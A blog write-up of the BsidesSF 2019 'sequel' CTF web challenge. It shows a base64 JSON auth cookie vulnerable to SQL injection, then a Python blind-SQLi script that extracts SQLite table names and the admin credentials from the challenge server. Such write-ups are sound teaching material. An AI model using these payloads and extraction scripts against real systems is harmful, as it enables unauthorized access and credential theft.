---
layout:     post
title:      'BsidesSF - sequel'
date:       2019-03-07 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'Write-ups'
---

BsidesSF was a great CTF, but as I could not finish many tasks withing the duration of the competition, I decided to come back to the ones with which I struggled the most. Here's my write up for ***sequel***, which is cool ***web*** challenge rated ***200*** points. 

```text
Location - https://sequel-9cba4c8e.challenges.bsidessf.net/
```

Firstly, we are given a link to the a service with a login form right at the index page. During the initial phase of my attack, I wanted to find some vulnerability in the form itself, but [@yodak5](https://twitter.com/yodak5) found that you can easily log in with a password combination of `guest:guest`. 

![Login Page](/img/bsidessf/sequel-login.png){:class="img-responsive center-block"}

After logging in, we can see a group of ratings for some hackers movies. One interesting thing is that line `Maybe the admin likes it too?`, which somehow gives us a hint that we should look for an admin user. 

![Movies Database](/img/bsidessf/sequel-database.png){:class="img-responsive center-block"}

Another interesting thing is a cookie that we're assigned after logging in.

```text
1337_AUTH=eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9
```

Decoding it from `base64` gives us `JSON` data of our username and password. 

```text
[w3ndige@main sequel]$ echo "eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9" | base64 -d
{"username":"guest","password":"guest"}
```

And that's when I've hit the wall and could not get further into the challenge during the CTF. But coming back to it, with clear brain, I've decided to check some common vulnerabilites and one thing I've noticed was `Server Error` while checking for ***SQL Injection***. I've immedietaly started tinkering with it.  

```
[w3ndige@main sequel]$ echo '{"username":"unknown\" OR \"1\"=\"2","password":"guest"}' | base64
eyJ1c2VybmFtZSI6InVua25vd25cIiBPUiBcIjFcIj1cIjIiLCJwYXNzd29yZCI6Imd1ZXN0In0K
[w3ndige@main sequel]$ curl --cookie "1337_AUTH=eyJ1c2VybmFtZSI6InVua25vd25cIiBPUiBcIjFcIj1cIjIiLCJwYXNzd29yZCI6Imd1ZXN0In0K" https://sequel-9cba4c8e.challenges.bsidessf.net/sequels
Invalid user.
```

In this example, our output is correct and we get `Invalid user` message. But once we change `2` to `1`, we are able to bypass the check. 

```html
[w3ndige@main sequel]$ echo '{"username":"unknown\" OR \"1\"=\"1","password":"guest"}' | base64
eyJ1c2VybmFtZSI6InVua25vd25cIiBPUiBcIjFcIj1cIjEiLCJwYXNzd29yZCI6Imd1ZXN0In0K
[w3ndige@main sequel]$ curl --cookie "1337_AUTH=eyJ1c2VybmFtZSI6InVua25vd25cIiBPUiBcIjFcIj1cIjEiLCJwYXNzd29yZCI6Imd1ZXN0In0K" https://sequel-9cba4c8e.challenges.bsidessf.net/sequels

<!doctype html>
<html>
<body class='text-center'>

<h2>Sequel Movie Database</h2>
<div class="sequels-container">
  <table class="sequels table">
    <thead>
      <tr>
        <th>Movie</th>
        <th>Rating</th>
        <th>Private Note</th>
      </tr>
    </thead>
    <tbody>
        <tr>
          <td class='name'>Hackers</td>
          <td class='star-rating'><i class='em em-star'></i><i class='em em-star'></i><i class='em em-star'></i><i class='em em-star'></i><i class='em em-star'></i></td>
          <td class='note'>No note for unknown&#34; OR &#34;1&#34;=&#34;1</td>
        </tr>
      
        <tr>
          <td class='name'>War Games</td>
          <td class='star-rating'><i class='em em-star'></i><i class='em em-star'></i><i class='em em-star'></i><i class='em em-star'></i><i class='em em-star'></i></td>
          <td class='note'>No note for unknown&#34; OR &#34;1&#34;=&#34;1</td>
        </tr>
      
        <tr>
          <td class='name'>Swordfish</td>
          <td class='star-rating'><i class='em em-star'></i><i class='em em-star'></i><i class='em em-star'></i></td>
          <td class='note'>No note for unknown&#34; OR &#34;1&#34;=&#34;1</td>
        </tr>
      
        <tr>
          <td class='name'>Sneakers</td>
          <td class='star-rating'><i class='em em-star'></i><i class='em em-star'></i><i class='em em-star'></i><i class='em em-star'></i></td>
          <td class='note'>No note for unknown&#34; OR &#34;1&#34;=&#34;1</td>
        </tr>
      
        <tr>
          <td class='name'>The Net</td>
          <td class='star-rating'><i class='em em-star'></i></td>
          <td class='note'>No note for unknown&#34; OR &#34;1&#34;=&#34;1</td>
        </tr>
      
    </tbody>
  </table>
</div>

  </body>
</html>
```

You can see that we're logged in and the values of notes changed, now we can't see any note for the films. After a little bit of thinking I've came up with an idea to use blind sql injection to try and crawl the database as we get different responses - `Invalid login` if we get a false and otherwise - good page. 

But firstly, we have to find out what database engine it uses inside, whether it's ***MySQL***, ***SQLLite*** or something completely different. My solution was to just slighlty modify two versions of exploits, each made for each of those two engines and just hope some will find something. And luckily for me, it was ***SQLLite***. 

Let's start with the succesful payload. 

{% raw %}
```json
{{"username":"\" OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \"a%\" limit 1) OR \"","password":"guest"}}
```
{% endraw %}

Here we use `EXISTS` function to see if we get any result from the subquery that will select every name from the `sqlite_master`. In addition it checks if the name starts with a provided letter, in this example, `a`.

As we don't want to do this manually, let's write a simple Python script.

{% raw %}
```python
import requests
import base64
import string
import sys

out = ""

while True:
    for letter in string.printable:
        tmp = out + letter

        payload = r'{{"username":"\" OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \"{}\" limit 1) OR \"","password":"guest"}}'.format(tmp + '%')

        payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

        r = requests.get('https://sequel-9cba4c8e.challenges.bsidessf.net/sequels', cookies={"1337_AUTH" : payload})
        if "Movie" in r.text:
            out = tmp
            sys.stdout.write(letter)
            sys.stdout.flush()
            break
```
{% endraw %}

During the first run, we get a `notes` table, but we can still look for others by just ignoring `n` letter. Add this snippet just before the `payload` - `if letter == 'n': continue`. 

```text
[w3ndige@main sequel]$ python exploit.py 
notes%
```

With this methodology, I've found `reviews` table. 

```text
[w3ndige@main sequel]$ python exploit.py 
reviews%
```

At this point I wanted to extract information from this table but could not find any column name that would succesfuly execute my query. Luckily, I've found another table worth noticing.

```text
[w3ndige@main sequel]$ python exploit.py 
uSeRiNfo%
```
Letters are in mixed cases as I've ignored the ones that found the tables previously. Luckily our `LIKE` statement isn't case sensitive so we can replace the letters with the lower case. 

If we have `userinfo` table, we can now try to extract the usernames and passwords. We have to remember that `guest` is already in the database, so that's a letter to ignore. 

{% raw %}
```python
import requests
import base64
import string
import sys

out = ""

while True:
    for letter in string.printable:
        tmp = out + letter

        if letter == 'g': continue

        payload = r'{{"username":"\" OR EXISTS(SELECT username FROM userinfo WHERE username LIKE \"{}\" limit 1) OR \"","password":"guest"}}'.format(tmp + '%')

        payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

        r = requests.get('https://sequel-9cba4c8e.challenges.bsidessf.net/sequels', cookies={"1337_AUTH" : payload})
        if "Movie" in r.text:
            out = tmp
            sys.stdout.write(letter)
            sys.stdout.flush()
            break
```
{% endraw %}

With that script we can get username, and password. Just change the username to password.

```
[w3ndige@main sequel]$ python exploit.py 
sequeladmin%%
[w3ndige@main sequel]$ python exploit.py 
f5ec3af19f0d3679e7d5a148f4ac323d%%
```

Now we can log in with this credentials and flag is right there.

![Flag](/img/bsidessf/sequel-flag.png){:class="img-responsive center-block"}
